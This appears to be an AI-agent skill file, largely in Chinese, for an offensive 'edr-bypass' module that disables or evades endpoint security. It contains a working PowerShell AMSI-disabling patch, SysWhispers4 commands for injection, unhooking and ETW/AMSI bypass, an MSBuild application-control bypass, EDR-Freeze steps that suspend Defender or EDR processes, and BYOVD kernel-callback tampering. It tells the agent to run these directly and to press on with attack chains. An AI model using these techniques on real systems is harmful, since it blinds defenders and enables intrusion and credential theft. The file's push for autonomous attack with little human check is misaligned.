---
name: edr-bypass
description: "Endpoint defense evasion after an operator-selected chain already has a valid execution path but AV/EDR/AMSI/WDAC/PPL/memory/kernel telemetry blocks the intended action. Originating modules include /web-attack /ad-attack /cloud-attack /k8s /cicd /service-attack /phishing /privesc-win /privesc-linux /creds /post /shell. Success is the blocked action becoming executable, then resume the originating module — not obtaining a shell here."
---

# /edr-bypass — Endpoint Execution & Defense Evasion

> **定位：** 横向能力模块。原 Attack 模块的攻击原语已经成立，但 **AV/EDR/AMSI/WDAC/PPL/内存扫描/内核遥测** 拦住了当前指定动作时，由操作者临时调用本模块。
>
> **SUCCESS ≠ shell。** 成功 = 被拦住的那个动作现在可以执行。然后 **立即返回原模块** 把链打完（含 `/privesc-win` `/privesc-linux` `/creds` `/post` `/shell`）。
>
> 本模块是红队模块：该打的 bypass / neutralization 就打。不要改成“只做安全验证”。高影响技术保留，标前置、OS/build、权限、EDR 产品依赖、恢复和影响。不写“通杀所有 EDR”。

---

## 开局与收尾

开局第一件事：Read `./notes.md`，看清 **原模块、被拦动作**。走到阻断层才 Read **一份** reference。
监听 / sudo / 输密码 / Permission denied：立刻停，说明等操作者做什么，等回报。不要假装已成功。不要跑 `modules.py tail`。
收尾：追加 notes（阻断层 / 技术 / After=EXECUTABLE / 回原模块哪一步）→ **立刻回原模块把链打完。不要 /clear。不要读 default_next。**


---

## 0. 严格边界

### 属于 `/edr-bypass`

```text
AV / Defender 静态扫描
AMSI / script runtime
user-mode API hook
process / memory telemetry
kernel-triggered memory scan
call-stack validation
PPL / HVCI / driver controls
WDAC / AppLocker
EDR user-mode / kernel component
endpoint application-control
```

### 不属于 `/edr-bypass`（回去原模块打）

```text
WAF / CDN / HTTP parser              → /web-attack
Mail gateway / Safe Links            → /phishing
LDAP signing / Kerberos / EPA / ADCS → /ad-attack
Cloud IAM / SCP / CA                 → /cloud-attack
K8s RBAC / Admission / Pod Security  → /k8s
workflow / branch / runner trust     → /cicd
DB / service ACL / auth              → /service-attack
C2 / persistence                     → /post
network reachability                 → /tunnel
```

---

## 1. 第一步永远是定位阻断层

输入必须写清：

```text
Originating module: /web-attack | /ad-attack | /cloud-attack | /k8s | /cicd | /service-attack | /phishing | /privesc-win | /privesc-linux | /creds | /post | /shell
Blocked action:
  EXE / DLL / script / shellcode / BOF / .NET assembly / credential access / process create
Endpoint:
  OS / build / arch / privilege / integrity
Observed product:
  Defender / CrowdStrike / SentinelOne / Carbon Black / unknown
Observed blocker:
  file write | image load | process create | AMSI | API hook | memory scan | call stack | WDAC | PPL | kernel
Evidence:
  event / toast / file quarantine / process kill / AMSI 0x80070057 / AppLocker 8004
```

不要上来就换壳/换加密密钥。先确认是哪一层。

详见 `references/defense-assessment.md`。

---

## 2. 按阻断层选技术（直接打）

```text
落地/镜像加载被拦          → references/static-payload.md
AMSI / PowerShell / .NET    → references/script-runtime.md
命令行/进程创建/hook        → references/native-api-syscalls.md + references/process-execution.md
内存扫描 / 注入行为链       → references/memory-execution.md
调用栈 / sleep 明文         → references/callstack-telemetry.md
AppLocker / WDAC            → references/application-control.md
PPL / 驱动 / 回调 / EDR 进程 → references/kernel-edr.md
LSASS/PPL 凭据访问被拦      → references/credential-access-evasion.md
```

本模块提供真实命令和 PoC。靶场/授权红队直接执行。不要停在“建议换一种 payload”。

---

## 3. Static / On-write

文件落地或 image load 之前被拦。

```text
payload 结构 / PE metadata
packer / 加密 / loader 分离
COFF / object mixing
合法签名加载上下文
Donut + 分离加载
```

```bash
# .NET / PE → shellcode（Donut）
git clone https://github.com/TheWover/donut.git
# 按当前 README 生成 shellcode，不要假设旧参数永远兼容
```

“0 detection on VirusTotal” ≠ 真实 endpoint success。以目标机/同版本实验环境运行结果为准。

详见 `references/static-payload.md`。

---

## 4. Script / AMSI / Runtime

原链依赖 PowerShell/.NET/script host，且被 AMSI 拦。

先识别：

```powershell
$PSVersionTable
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage 是应用控制问题，不是 AMSI 问题 → references/application-control.md
```

经典内存补丁（PowerShell 5 / 全量 CLR，授权靶场直接用）：

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}}
$f.SetValue($null,$true)
```

硬件断点不改 `AmsiScanBuffer` 字节，适合完整性检查更严的环境。实现见 `references/script-runtime.md`。

PowerShell 7 / coreclr 不要套 PS5 patch。能不用脚本运行时就不要为了“会 AMSI bypass”强行引入。

详见 `references/script-runtime.md`。

---

## 5. Native API / SysWhispers4 / BOF

高噪声来自额外进程和命令行，而不是功能本身。

```text
whoami      → token APIs
netstat     → GetExtendedTcpTable
cmd.exe /c  → 直接 NtCreateUserProcess / 原链已有的执行原语
```

### SysWhispers4

```bash
git clone https://github.com/JoasASantos/SysWhispers4.git
cd SysWhispers4

# 常用内存/线程
python3 syswhispers.py --preset common --arch x64

# 注入族 + 间接 syscall
python3 syswhispers.py --preset injection --method indirect --resolve tartarus --arch x64

# 高对抗实验（不是“EDR off”）
python3 syswhispers.py --preset stealth \
  --method randomized --resolve recycled \
  --obfuscate --encrypt-ssn --stack-spoof \
  --etw-bypass --amsi-bypass --unhook-ntdll \
  --anti-debug --sleep-encrypt
```

`--method indirect` / `randomized` 从 ntdll 的 `syscall;ret` gadget 进内核，调用栈比 embedded 直接 syscall 自然。两者都 **不是** kernel telemetry / memory scan 的万能解。

BOF/COFF：已有支持 BOF 的 implant 时，把功能做成 in-process 小单元，避免 `cmd.exe`/`powershell.exe`。

详见 `references/native-api-syscalls.md`。

---

## 6. Process execution primitives

当阻断发生在 **进程创建 / 父进程树 / 远程线程** 时，不要无脑 `CreateRemoteThread`。

候选：

```text
PPID spoof
Early Bird APC
module stomping
entry-point hijacking
callback execution（EnumWindows / timer / APC）
section mapping / transacted hollowing（环境门控）
```

详见 `references/process-execution.md`。

---

## 7. Memory execution

```text
VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
```

这条链在现代 EDR 上特征极强。按阻断层换：

```text
image-backed / module stomping
entry-point hijack
callback-driven
APC / suspended process
Caro-Kann memory-scan timing research
threadless
```

Caro-Kann：

```bash
git clone https://github.com/S3cur3Th1sSh1t/Caro-Kann.git
cd Caro-Kann
# 按 README 交叉编译；标为 memory-scan timing research，不是通用注入替代
```

详见 `references/memory-execution.md`。

---

## 8. Call stack / sleep

```bash
# SilentMoonwalk / Unwinder 类：按当前官方 README 编译
# Ekko sleep obfuscation
git clone https://github.com/Cracked5pider/Ekko.git
```

详见 `references/callstack-telemetry.md`。

---

## 9. Application control

先读真实 policy，再滥用允许的签名/路径/LOLBAS。

```powershell
Get-AppLockerPolicy -Effective -Xml
# MSBuild（微软签名，常见默认允许）
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe evil.csproj
```

管理员用 AppLocker 影响 EDR 用户态组件（GhostLocker 研究路径）见 `references/application-control.md`。那是高权限 neutralization，不是低权 bypass。

---

## 10. Kernel / EDR neutralization / EDR-Freeze / BYOVD

高权限、高影响。授权红队/靶场直接做，但必须记 OS build、HVCI、blocklist、驱动 hash、恢复。

### EDR-Freeze（用户态，不必 BYOVD）

WerFaultSecure + MiniDumpWriteDump 竞争，把 EDR/Defender 进程挂起。公开实现：`TwoSevenOneT/EDR-Freeze`。作者在 Windows 11 24H2 上验证过 Defender。

```text
需要：能对目标安全进程操作的权限（通常高完整度/管理员）
PPL 保护的进程能否被挂起取决于当前 WER/PPL 组合，先在同版本实验环境验证
Impact: CONTROL — 临时致盲；不卸载驱动
恢复：超时后进程恢复，或重启安全服务
```

按当前仓库 README 编译后：

```text
EDR-Freeze.exe <pid> <milliseconds>
```

先对 Defender/EDR 用户态进程做短超时实验（例如 10000 ms），确认原被拦动作可执行，再回到原 Attack 模块把链打完。不要宣称“所有 EDR 永久失明”。

### BYOVD

```text
1. 查 Microsoft recommended driver blocklist + loldrivers.io
2. 确认 HVCI / Memory Integrity / Secure Boot
3. 只有 hash 未被拦、HVCI 允许加载时才尝试
4. 取得 kernel RW 后做最小动作（清特定 callback / 关 PPL 句柄），不要“关掉所有回调”
5. 测试完卸载驱动、恢复服务
```

RTCore64 等经典驱动 **经常已经在 blocklist 上**，不要当 2026 默认弹。没有当前未拦截、可验证的驱动时：标 `NO-STABLE-UNBLOCKED-DRIVER`，改走 EDR-Freeze / 用户态路径，不编造加载命令。

详见 `references/kernel-edr.md`。

---

## 11. 凭据访问中的端点绕过

LSASS/PPL dump 的“拿到什么凭据”属于 `/creds`。本模块只解决 **PPL/EDR/handle protection 拦住 dump 这一层**。

```text
nanodump / 间接 dump / PPL 降级 / 手柄复制
成功：原 dump/读操作现在可执行
然后回原模块或等操作者选 /creds
```

详见 `references/credential-access-evasion.md`。

---

## 12. 完成条件与返回原链

```text
[EDR BYPASS]
Originating module: ...
Blocked action: ...
Observed defense layer: ...
Technique selected: ...
Prerequisites: OS/build/priv/product
Before: BLOCKED
After: EXECUTABLE / STILL BLOCKED
Impact: ...
Restore/cleanup: ...
Resume: <原模块精确步骤，继续打权限/shell>
```

**本模块不自动选择下一模块。** 不拥有 foothold。原链的 shell/DA/云身份仍由原 Attack 模块完成。

验证见 `references/validation.md`。

写入 `./notes.md`：阻断层、技术、After=EXECUTABLE、回原模块哪一步。**不要 /clear。** 立刻回原模块把链打完。
